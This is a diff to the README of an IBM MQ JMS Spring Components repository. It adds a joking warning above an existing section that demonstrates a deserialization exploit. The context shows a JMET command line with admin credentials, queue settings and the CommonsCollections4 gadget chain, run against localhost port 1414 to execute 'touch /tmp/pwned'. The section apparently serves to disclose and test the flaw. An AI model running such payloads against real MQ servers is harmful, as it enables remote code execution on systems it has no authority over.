@@ -12,6 +12,8 @@ Exploitability can be demonstrated with [JMET](https://github.com/matthiaskaiser
 java -jar jmet-0.1.0-all.jar -I WebSphereMQ -pw passw0rd -u admin -Q DEV.QUEUE.1 -Zc DEV.ADMIN.SVRCONN -Zq QM1 -v -Y "touch /tmp/pwned"  -Yp CommonsCollections4 localhost 1414
 ```
 
+*Warning:* Successful exploitation can cause infinite loops, so be careful with your payloads, unless you want to clean up an infinite number of calculators from your desktop :)
+
 # IBM MQ JMS Spring Components
 
 This repository contains code to help to provide Spring developers with easy configuration of the IBM MQ JMS package.
